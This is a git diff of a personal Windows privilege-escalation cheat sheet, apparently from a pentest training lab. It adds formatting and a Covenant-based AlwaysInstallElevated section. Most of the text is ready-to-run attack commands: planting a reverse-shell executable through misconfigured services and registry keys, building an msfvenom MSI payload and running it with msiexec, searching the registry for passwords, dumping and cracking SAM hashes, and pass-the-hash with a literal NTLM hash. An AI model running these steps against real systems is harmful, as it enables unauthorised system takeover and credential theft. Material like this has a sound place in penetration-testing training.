@@ -2,6 +2,8 @@
 
 ### generating reverse shell
 
+---
+
 On kali:
 
 ```bash
@@ -36,6 +38,8 @@ C:\PrivEsc\reverse.exe
 
 ### insecure service permissions
 
+---
+
 Check user account perms on "daclsvc" service
 
 ```
@@ -59,6 +63,8 @@ sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
 ```
 
 ### unquoted service path
+
+---
 
 Query `unquotedsvc` service:
 
@@ -92,6 +98,8 @@ net start unquotedsvc
 
 ### weak registry perms
 
+---
+
 ```
 sc qc regsvc
 ```
@@ -109,6 +117,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 ```
 
 ### insecure service executables
+
+---
 
 check if service is running as system:
 
@@ -130,6 +140,8 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\fileperms
 
 ### autoruns
 
+---
+
 query registry for Autoruns:
 
 ```
@@ -150,6 +162,10 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
 
 ### always install elevated
 
+---
+
+##### kali
+
 check if keys are set to 0x1:
 
 ```
@@ -169,7 +185,58 @@ transfer to windows, run this cmd:
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
+##### covenant
+
+Make sure that you have a medium-integrity grunt. 
+
+Enumerate with `PowerUp.ps1` or `SharpUp audit`. Look for 1's on `HKLM` and `HKCU` under `AlwaysInstallElevated Registry Keys`:
+
+Output on SharpUp:
+
+```
+=== AlwaysInstallElevated Registry Keys ===
+
+	HKLM:	1
+	HKCU: 	1
+	
+```
+
+Output on PowerUp.ps1:
+
+```
+[*] Checking for AlwaysInstallElevated registry key...
+
+
+AbuseFunction : Write-UserAddMSI
+
+```
+
+On Kali:
+
+```bash
+msfvenom -p windows/exec CMD="blahblahblah" -i msi -o file.msi
+```
+
+replace "blahblahblah" with shellcode
+
+On Covenant:
+
+```
+upload /filepath:"C:\Users\Public\file.msi"
+
+* select file *
+
+ChangeDirectory C:\Users\Public
+ls
+```
+
+```
+shell msiexec /quiet /qn /i file.msi
+```
+
 ### passwords in registry
+
+---
 
 ```
 reg query HKLM /f password /t REG_SZ /s
@@ -187,6 +254,8 @@ winexe -U 'admin%password' //10.10.241.122 cmd.exe
 
 ### saved creds
 
+---
+
 List saved creds:
 
 ```
@@ -200,6 +269,8 @@ runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
 
 ### SAM
+
+---
 
 copy SAM and SYSTEM files to kali.
 
@@ -215,7 +286,17 @@ hashcat -m 1000 --force hashes.txt /usr/share/wordlists/rockyou.txt
 
 ### pass the hash
 
+---
+
 ```bash
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.180.131 cmd.exe 
 ```
+
+### autologons
+
+---
+
+On Covenant:
+
+* Enumerate with `PowerUp.ps1` or `Seatbelt WindowsAutoLogon` to view Autologon credentials
 
